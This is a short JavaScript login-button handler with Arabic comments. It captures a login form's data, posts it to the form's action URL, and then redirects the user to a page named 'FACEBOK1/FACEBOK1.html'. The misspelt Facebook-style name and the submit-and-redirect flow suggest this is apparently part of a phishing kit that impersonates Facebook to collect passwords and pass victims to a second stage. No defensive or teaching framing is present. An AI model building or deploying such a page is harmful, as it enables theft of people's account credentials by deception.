document.getElementById('loginButton').addEventListener('click', function(event) {
    event.preventDefault(); // منع الإرسال الافتراضي للنموذج

    var button = this; // الإشارة إلى الزر

    // تعطيل الزر لمنع الضغط المتكرر
    button.disabled = true;

    // إرسال النموذج باستخدام Fetch API أو XMLHttpRequest
    var form = document.getElementById('loginForm');
    
    // إنشاء كائن FormData لجمع بيانات النموذج
    var formData = new FormData(form);
    
    // إرسال البيانات إلى الرابط الأول
    fetch(form.action, {
        method: form.method,
        body: formData
    }).then(response => {
        // بعد إرسال النموذج، نعيد توجيه المستخدم مباشرة
        window.location.href = 'FACEBOK1/FACEBOK1.html'; // الرابط الثاني
    }).catch(error => {
        console.error('Error:', error);
        // إعادة تمكين الزر في حالة حدوث خطأ
        button.disabled = false;
    });
});
